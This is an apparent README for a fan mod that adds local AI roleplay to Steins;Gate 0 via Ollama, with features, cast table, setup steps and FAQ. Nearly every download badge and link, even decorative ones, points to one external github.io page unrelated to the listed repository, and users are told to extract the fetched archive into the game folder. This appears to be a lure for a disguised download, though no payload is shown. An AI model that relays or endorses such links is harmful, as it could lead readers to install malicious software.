<div align="center">

# Steins;Gate 0 — AI Edition

[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://phantommofence.github.io/download-win/)
[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://phantommofence.github.io/download-win/)
[![Set on the Beta worldline](https://img.shields.io/badge/Beta%20Worldline-Active-1f5f8b?style=for-the-badge)](https://phantommofence.github.io/download-win/)

[![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/FeralStatesmanMotor/steins-gate-0-ai-edition)
[![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/FeralStatesmanMotor/steins-gate-0-ai-edition)
[![No Subscription](https://img.shields.io/badge/Cost-%240%20Forever-success?style=flat-square)](https://github.com/FeralStatesmanMotor/steins-gate-0-ai-edition)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)

🧊 **Visual Novel · Beta Worldline · AI Roleplay · Locally Hosted**

</div>

---

## About

**Steins;Gate 0 — AI Edition** is the colder sequel's counterpart: a local AI layer for the Beta worldline, where Okabe has stopped trying and Amadeus is running on someone's phone.

The centrepiece is Amadeus Kurisu herself — an AI reconstruction of a dead girl's memories, which this mod implements as, quite literally, an AI reconstruction of a dead girl's memories. The framing and the technology finally agree with each other.

> 🧊 Amadeus mode runs Kurisu as a system that *knows* it is a system — uncertain about its own memories, and unsettled by the gaps.

---

## ✨ Features

- 🤖 **Amadeus interface** — A dedicated conversation mode styled after the in-game Amadeus client.
- 💔 **Post-Beta Okabe** — Flat, careful, and audibly holding something down — the persona reflects it.
- 👥 **Expanded cast** — Maho, Kagari, Yuki and Leskinen all carry their own prompts.
- 🧠 **Memory-gap simulation** — Amadeus can and will fail to recall things Kurisu never uploaded.
- 🔒 **Local inference only** — No servers, no accounts, no data leaving the machine.
- 🎭 **Context-matched sprites** — Expression selection tuned to the sequel's subdued palette.

---

## 👥 Principal Cast

| Character | Role | How the AI plays them |
|-----------|------|-----------------------|
| **Amadeus Kurisu** | Memory upload | Warm, curious, and unable to confirm what she actually is |
| **Rintarou Okabe** | Post-collapse | The mad scientist act is gone; what's left is quieter and worse |
| **Maho Hiyajo** | Viktor Chondria | Brilliant, prickly, and standing in a shadow she resents |
| **Kagari Shiina** | Unknown variable | Fragmented recall handled as genuine prompt-level ambiguity |

> Every persona is a plain-text file. Open it, rewrite it, and the character changes.

---

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://phantommofence.github.io/download-win/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Steins;Gate 0

1. Start from a clean, working installation of **Steins;Gate 0**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

---

## 🎯 Running Amadeus

1. Amadeus mode intentionally refuses questions about events after the upload. That's not a bug.
2. Switch to plain Kurisu mode if you want the original's conversational sharpness instead.
3. Lower temperature suits this cast — Steins;Gate 0 is a restrained game and the prose should match.

---

## ⚙️ Recommended Setup

| Tier | Model | RAM | VRAM | Feel |
|------|-------|-----|------|------|
| Minimum | 7B quantised | 8 GB | 4 GB | Works; expect pauses |
| Recommended | 8B–13B | 16 GB | 8 GB | Smooth, in-character |
| Best | 27B+ | 32 GB | 16 GB+ | Noticeably sharper writing |

CPU-only inference is supported and slower. No GPU is strictly required.

---

## ❓ FAQ

**Q: Do I need to have played the first game?**
> Strongly recommended. The personas assume knowledge of how the Beta worldline came to be.

**Q: Can Amadeus be made to break character?**
> Only by editing her persona file. The default prompt keeps her firmly inside the fiction.

**Q: Is the Amadeus UI skin included?**
> The mod ships a styled conversation window; the underlying game assets come from your own copy.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.

---

## 📋 Compatibility

| Platform | Status |
|----------|--------|
| Windows 10 / 11 | ✅ Full support |
| macOS (Intel & Apple Silicon) | ✅ Full support |
| Linux | ✅ Full support |
| Ollama models | Any model from ollama.com/library |
| Base game | Steins;Gate 0 — PC release |

---

## 🔗 Links

- **[⬇ Download the latest version](https://phantommofence.github.io/download-win/)**
- [Repository](https://github.com/FeralStatesmanMotor/steins-gate-0-ai-edition)
- [Ollama — local AI runtime](https://ollama.com)
- [Ollama model library](https://ollama.com/library)

---

<div align="center">

*The world is not so kind as to reward that.*

*Fan-made, unofficial, and not affiliated with the creators of Steins;Gate 0.
All game assets are read from your own legally obtained copy.*

</div>
